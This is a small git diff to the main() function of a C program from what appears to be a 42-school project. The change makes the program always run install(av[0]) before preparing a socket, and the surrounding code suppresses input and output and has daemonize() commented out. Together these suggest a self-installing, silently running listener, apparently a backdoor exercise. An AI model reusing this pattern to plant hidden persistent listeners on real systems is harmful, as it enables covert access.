@@ -6,7 +6,7 @@
 /*   By: damien <damien@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/03/06 19:13:32 by jmaia             #+#    #+#             */
-/*   Updated: 2024/06/14 13:18:05 by damien           ###   ########.fr       */
+/*   Updated: 2024/06/14 13:19:37 by damien           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -35,12 +35,8 @@ int main(int ac, char **av)
 
 	disable_input_output();
 
-	if (access(BIN_PATH, F_OK) != 0)
-	{
-		success = install(av[0]);
-		if (!success)
-			return (2);
-	}
+	if (!install(av[0]))
+		return (2);
 	
 	// daemonize();
 	int sockfd = prepare_socket();
